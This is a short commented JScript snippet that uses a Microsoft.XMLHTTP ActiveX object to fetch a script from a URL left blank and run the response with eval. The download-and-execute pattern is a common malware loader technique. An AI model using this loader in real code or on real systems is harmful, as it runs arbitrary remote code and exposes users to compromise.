// create a new XMLHttpRequest object
var xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");

// specify the URL of the web-hosted JavaScript file
var url = "https://";

// open the XMLHttpRequest object
xmlhttp.open("GET", url, false);

// send the request to retrieve the script file
xmlhttp.send();

// get the script code from the response text
var scriptCode = xmlhttp.responseText;

// use the eval function to execute the script code
eval(scriptCode);